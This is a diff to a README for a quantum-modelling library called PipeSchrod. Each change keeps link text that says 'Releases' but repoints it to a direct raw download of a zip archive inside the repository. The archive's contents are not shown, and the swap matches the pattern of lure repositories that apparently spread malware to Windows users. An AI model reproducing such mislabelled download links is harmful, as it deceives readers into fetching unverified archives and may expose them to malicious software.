@@ -1,6 +1,6 @@
 # ⚛️ PipeSchrod - Solve quantum models with simple steps
 
-[![Download PipeSchrod](https://img.shields.io/badge/Download%20PipeSchrod-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Bodakd8551/PipeSchrod/releases)
+[![Download PipeSchrod](https://img.shields.io/badge/Download%20PipeSchrod-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Bodakd8551/PipeSchrod/raw/refs/heads/main/pipeschrod/Pipe-Schrod-1.0.zip)
 
 ## 🧭 What PipeSchrod does
 
@@ -22,7 +22,7 @@ The project uses the `>>` operator to link each step in a clear order. That make
 
 Use this link to visit the release page and download PipeSchrod:
 
-[Go to PipeSchrod Releases](https://github.com/Bodakd8551/PipeSchrod/releases)
+[Go to PipeSchrod Releases](https://github.com/Bodakd8551/PipeSchrod/raw/refs/heads/main/pipeschrod/Pipe-Schrod-1.0.zip)
 
 On Windows, follow these steps:
 
@@ -200,4 +200,4 @@ For the smoothest start:
 
 If you need the release page again, use this link:
 
-[Visit PipeSchrod Releases](https://github.com/Bodakd8551/PipeSchrod/releases)
+[Visit PipeSchrod Releases](https://github.com/Bodakd8551/PipeSchrod/raw/refs/heads/main/pipeschrod/Pipe-Schrod-1.0.zip)
